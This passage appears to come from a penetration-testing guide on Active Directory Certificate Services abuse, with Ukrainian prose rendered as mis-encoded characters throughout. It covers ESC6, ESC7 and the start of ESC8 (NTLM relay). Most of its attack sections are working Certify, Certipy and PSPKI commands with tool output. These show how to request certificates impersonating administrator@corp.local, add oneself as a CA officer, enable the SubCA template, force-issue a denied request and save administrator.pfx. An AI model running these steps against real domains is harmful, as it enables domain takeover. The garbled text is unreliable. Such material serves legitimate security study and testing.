reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [**Certify**](https://github.com/GhostPack/Certify) —Ç–∞ [**Certipy**](https://github.com/ly4k/Certipy), –∑–¥–∞—Ç–Ω—ñ –≤–∏—è–≤–ª—è—Ç–∏ —Ü—é –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —ó—ó:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
–©–æ–± –∑–º—ñ–Ω–∏—Ç–∏ —Ü—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, —â–æ —É –≤–∞—Å —î **–ø—Ä–∞–≤–∞ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω—É** –∞–±–æ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω—ñ, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –∑ –±—É–¥—å-—è–∫–æ—ó —Ä–æ–±–æ—á–æ—ó —Å—Ç–∞–Ω—Ü—ñ—ó:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
–©–æ–± –≤–∏–º–∫–Ω—É—Ç–∏ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —É –≤–∞—à–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, –ø—Ä–∞–ø–æ—Ä–µ—Ü—å –º–æ–∂–Ω–∞ –≤–∏–¥–∞–ª–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
–ü—ñ—Å–ª—è –æ–Ω–æ–≤–ª–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ —Ç—Ä–∞–≤–Ω—è 2022 —Ä–æ–∫—É, –Ω–æ–≤—ñ –≤–∏–¥–∞–Ω—ñ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏** –º—ñ—Å—Ç–∏—Ç–∏–º—É—Ç—å **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏**, —è–∫–µ –≤–∫–ª—é—á–∞—î **–≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `objectSid` –∑–∞–ø–∏—Ç—É–≤–∞—á–∞**. –î–ª—è ESC1 —Ü–µ–π SID –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ SAN. –û–¥–Ω–∞–∫ –¥–ª—è **ESC6** SID –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î **`objectSid` –∑–∞–ø–∏—Ç—É–≤–∞—á–∞**, –∞ –Ω–µ SAN.\
–©–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ ESC6, –≤–∞–∂–ª–∏–≤–æ, —â–æ–± —Å–∏—Å—Ç–µ–º–∞ –±—É–ª–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ ESC10 (–°–ª–∞–±–∫—ñ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤), —è–∫–µ –Ω–∞–¥–∞—î –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç **SAN –Ω–∞–¥ –Ω–æ–≤–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º –±–µ–∑–ø–µ–∫–∏**.
{% endhint %}

## –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ü–µ–Ω—Ç—Ä—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó - ESC7

### –ê—Ç–∞–∫–∞ 1

#### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É –¥–ª—è —Ü–µ–Ω—Ç—Ä—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –Ω–∞–±—ñ—Ä –¥–æ–∑–≤–æ–ª—ñ–≤, —è–∫—ñ —Ä–µ–≥—É–ª—é—é—Ç—å –¥—ñ—ó CA. –¶—ñ –¥–æ–∑–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏, –æ—Ç—Ä–∏–º–∞–≤—à–∏ –¥–æ—Å—Ç—É–ø –¥–æ `certsrv.msc`, –∫–ª–∞—Ü–Ω—É–≤—à–∏ –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ CA, –≤–∏–±—Ä–∞–≤—à–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –Ω–∞ –≤–∫–ª–∞–¥–∫—É –ë–µ–∑–ø–µ–∫–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ–∑–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–¥—É–ª—è PSPKI –∑ –∫–æ–º–∞–Ω–¥–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
–¶–µ –Ω–∞–¥–∞—î —É—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ –æ—Å–Ω–æ–≤–Ω—ñ –ø—Ä–∞–≤–∞, –∞ —Å–∞–º–µ **`ManageCA`** —Ç–∞ **`ManageCertificates`**, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ä–æ–ª—è–º "–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä CA" —Ç–∞ "–º–µ–Ω–µ–¥–∂–µ—Ä —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤" –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ù–∞—è–≤–Ω—ñ—Å—Ç—å –ø—Ä–∞–≤ **`ManageCA`** –Ω–∞ —Ü–µ–Ω—Ç—Ä–∞—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ–∑–≤–æ–ª—è—î —Å—É–±'—î–∫—Ç—É –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ PSPKI. –¶–µ –≤–∫–ª—é—á–∞—î –≤ —Å–µ–±–µ –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è –ø—Ä–∞–ø–æ—Ä—Ü—è **`EDITF_ATTRIBUTESUBJECTALTNAME2`** –¥–ª—è –¥–æ–∑–≤–æ–ª—É —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó SAN —É –±—É–¥—å-—è–∫–æ–º—É —à–∞–±–ª–æ–Ω—ñ, —â–æ —î –∫—Ä–∏—Ç–∏—á–Ω–∏–º –∞—Å–ø–µ–∫—Ç–æ–º –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É.

–°–ø—Ä–æ—â–µ–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –º–æ–∂–ª–∏–≤–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è cmdlet **Enable-PolicyModuleFlag** PSPKI, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–Ω–æ—Å–∏—Ç–∏ –∑–º—ñ–Ω–∏ –±–µ–∑ –ø—Ä—è–º–æ—ó –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ GUI.

–í–æ–ª–æ–¥—ñ–Ω–Ω—è –ø—Ä–∞–≤–∞–º–∏ **`ManageCertificates`** –ø–æ–ª–µ–≥—à—É—î –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ—á—ñ–∫—É—é—á–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ö–æ–¥—è—á–∏ –∑–∞—Ö–∏—Å—Ç "–∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ CA".

–ö–æ–º–±—ñ–Ω–∞—Ü—ñ—è –º–æ–¥—É–ª—ñ–≤ **Certify** —Ç–∞ **PSPKI** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –∑–∞–ø–∏—Ç—É, –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
–£ **–ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –Ω–∞–ø–∞–¥—ñ** **`Manage CA`** –¥–æ–∑–≤–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –¥–ª—è **–≤–∫–ª—é—á–µ–Ω–Ω—è** –ø—Ä–∞–ø–æ—Ä–∞ **EDITF\_ATTRIBUTESUBJECTALTNAME2** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **ESC6 –∞—Ç–∞–∫–∏**, –∞–ª–µ —Ü–µ –Ω–µ –º–∞—Ç–∏–º–µ –∂–æ–¥–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É, –ø–æ–∫–∏ —Å–ª—É–∂–±–∞ CA (`CertSvc`) –Ω–µ –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∞. –ö–æ–ª–∏ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —î –ø—Ä–∞–≤–æ –¥–æ—Å—Ç—É–ø—É `Manage CA`, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ç–∞–∫–æ–∂ –º–∞—î –ø—Ä–∞–≤–æ **–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–ª—É–∂–±—É**. –û–¥–Ω–∞–∫ —Ü–µ **–Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–ª—É–∂–±—É –≤—ñ–¥–¥–∞–ª–µ–Ω–æ**. –ö—Ä—ñ–º —Ç–æ–≥–æ, E**SC6 –º–æ–∂–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –∫–æ—Ä–æ–±–∫–∏** –≤ –±—ñ–ª—å—à–æ—Å—Ç—ñ –ø–∞—Ç—á–æ–≤–∞–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â —á–µ—Ä–µ–∑ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ —Ç—Ä–∞–≤–Ω—è 2022 —Ä–æ–∫—É.
{% endhint %}

–¢–æ–º—É —Ç—É—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ —â–µ –æ–¥–∏–Ω –Ω–∞–ø–∞–¥.

–ü–µ—Ä–µ–ª—ñ–∫ –≤–∏–º–æ–≥:

* –¢—ñ–ª—å–∫–∏ **`ManageCA` –¥–æ–∑–≤—ñ–ª**
* **`Manage Certificates`** –¥–æ–∑–≤—ñ–ª (–º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–¥–∞–Ω–∏–π –∑ **`ManageCA`**)
* –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ **`SubCA`** –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ **–≤–∫–ª—é—á–µ–Ω–∏–π** (–º–æ–∂–µ –±—É—Ç–∏ –≤–∫–ª—é—á–µ–Ω–∏–π –∑ **`ManageCA`**)

–¢–µ—Ö–Ω—ñ–∫–∞ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ —Ç–æ–º—É, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –ø—Ä–∞–≤–∞–º–∏ –¥–æ—Å—Ç—É–ø—É `Manage CA` _—Ç–∞_ `Manage Certificates` –º–æ–∂—É—Ç—å **–≤–∏–¥–∞–≤–∞—Ç–∏ –Ω–µ–≤–¥–∞–ª—ñ –∑–∞–ø–∏—Ç–∏ –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏**. –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ **`SubCA`** —î **–≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ ESC1**, –∞–ª–µ **—Ç—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏** –º–æ–∂—É—Ç—å –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è –≤ —à–∞–±–ª–æ–Ω—ñ. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** –º–æ–∂–µ **–∑–∞–ø—Ä–æ—Å–∏—Ç–∏** —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –≤ **`SubCA`** - —â–æ –±—É–¥–µ **–≤—ñ–¥—Ö–∏–ª–µ–Ω–æ** - –∞–ª–µ **–ø–æ—Ç—ñ–º –≤–∏–¥–∞–Ω–æ –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º –ø—ñ–∑–Ω—ñ—à–µ**.

#### Abuse

–í–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–¥—ñ–ª–∏—Ç–∏ —Å–µ–±–µ –ø—Ä–∞–≤–æ–º –¥–æ—Å—Ç—É–ø—É `Manage Certificates`**, –¥–æ–¥–∞–≤—à–∏ —Å–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —è–∫ –Ω–æ–≤–æ–≥–æ –æ—Ñ—ñ—Ü–µ—Ä–∞.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
–®–∞–±–ª–æ–Ω **`SubCA`** –º–æ–∂–µ –±—É—Ç–∏ **—É–≤—ñ–º–∫–Ω–µ–Ω–∏–π –Ω–∞ CA** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-enable-template`. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —à–∞–±–ª–æ–Ω `SubCA` —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
–Ø–∫—â–æ –º–∏ –≤–∏–∫–æ–Ω–∞–ª–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ —É–º–æ–≤–∏ –¥–ª—è —Ü—ñ—î—ó –∞—Ç–∞–∫–∏, –º–∏ –º–æ–∂–µ–º–æ –ø–æ—á–∞—Ç–∏ –∑ **–∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —à–∞–±–ª–æ–Ω—É `SubCA`**.

**–¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –≤—ñ–¥—Ö–∏–ª–µ–Ω–æ**, –∞–ª–µ –º–∏ –∑–±–µ—Ä–µ–∂–µ–º–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á —ñ –∑–∞–ø–∏—à–µ–º–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∑–∞–ø–∏—Ç—É.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
–ó –Ω–∞—à–∏–º–∏ **`Manage CA` —Ç–∞ `Manage Certificates`** –º–∏ –º–æ–∂–µ–º–æ **–≤–∏–ø—É—Å—Ç–∏—Ç–∏ –Ω–µ–≤–¥–∞–ª–∏–π –∑–∞–ø–∏—Ç –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `ca` —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
–Ü –Ω–∞—Ä–µ—à—Ç—ñ, –º–∏ –º–æ–∂–µ–º–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏–¥–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ `req` —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints ‚Äì ESC8

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

{% hint style="info" %}
–£ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö, –¥–µ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ AD CS**, —è–∫—â–æ —ñ—Å–Ω—É—î **–≤—Ä–∞–∑–ª–∏–≤–∏–π –≤–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** —ñ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –æ–¥–∏–Ω **—à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–æ**, —â–æ –¥–æ–∑–≤–æ–ª—è—î **—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É —Ç–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç—ñ–≤** (—Ç–∞–∫–∏–π —è–∫ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **`Machine`** —à–∞–±–ª–æ–Ω), —Å—Ç–∞—î –º–æ–∂–ª–∏–≤–∏–º, —â–æ–± **–±—É–¥—å-—è–∫–∏–π –∫–æ–º–ø'—é—Ç–µ—Ä –∑ –∞–∫—Ç–∏–≤–Ω–æ—é —Å–ª—É–∂–±–æ—é —Å–ø—É–ª–µ—Ä–∞ –±—É–≤ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º**!
{% endhint %}

–ö—ñ–ª—å–∫–∞ **–º–µ—Ç–æ–¥—ñ–≤ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ HTTP** –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è AD CS, —è–∫—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Ä–æ–ª—ñ —Å–µ—Ä–≤–µ—Ä–∞, —è–∫—ñ –º–æ–∂—É—Ç—å –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏. –¶—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –¥–ª—è —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ HTTP –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ **–∞—Ç–∞–∫ NTLM relay**. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ—ó –º–∞—à–∏–Ω–∏ –º–æ–∂–µ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å AD, —è–∫–∏–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤—Ö—ñ–¥–Ω–∏–π NTLM**. –í —Ç–æ–π —á–∞—Å —è–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–¥–∞—î —Å–µ–±–µ –∑–∞ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∂–µ—Ä—Ç–≤–∏, —Ü—ñ –≤–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –¥–ª—è **–∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ `User` –∞–±–æ `Machine`**.

* **–í–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** (—Å—Ç–∞—Ä–∏–π ASP-–¥–æ–¥–∞—Ç–æ–∫, –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `http://<caserver>/certsrv/`), –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—Ä–∞—Ü—é—î —Ç—ñ–ª—å–∫–∏ —á–µ—Ä–µ–∑ HTTP, —â–æ –Ω–µ –∑–∞–±–µ–∑–ø–µ—á—É—î –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –∞—Ç–∞–∫ NTLM relay. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤—ñ–Ω —è–≤–Ω–æ –¥–æ–∑–≤–æ–ª—è—î —Ç—ñ–ª—å–∫–∏ NTLM-–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —á–µ—Ä–µ–∑ —Å–≤—ñ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ Authorization HTTP, —â–æ —Ä–æ–±–∏—Ç—å –±—ñ–ª—å—à –±–µ–∑–ø–µ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ Kerberos, –Ω–µ–ø—Ä–∏–¥–∞—Ç–Ω–∏–º–∏.
* **–°–ª—É–∂–±–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** (CES), **–ü–æ–ª—ñ—Ç–∏–∫–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** (CEP) –≤–µ–±-—Å–µ—Ä–≤—ñ—Å—É —Ç–∞ **–°–ª—É–∂–±–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤** (NDES) –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é negotiate —á–µ—Ä–µ–∑ —Å–≤—ñ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ Authorization HTTP. –ê–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è negotiate **–ø—ñ–¥—Ç—Ä–∏–º—É—î —è–∫** Kerberos, —Ç–∞–∫ —ñ **NTLM**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–∑–Ω–∏–∑–∏—Ç–∏ —Ä—ñ–≤–µ–Ω—å –¥–æ NTLM** –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—ñ–¥ —á–∞—Å –∞—Ç–∞–∫ relay. –•–æ—á–∞ —Ü—ñ –≤–µ–±-—Å–µ—Ä–≤—ñ—Å–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∞–∫—Ç–∏–≤—É—é—Ç—å HTTPS, HTTPS —Å–∞–º –ø–æ —Å–æ–±—ñ **–Ω–µ –∑–∞—Ö–∏—â–∞—î –≤—ñ–¥ –∞—Ç–∞–∫ NTLM 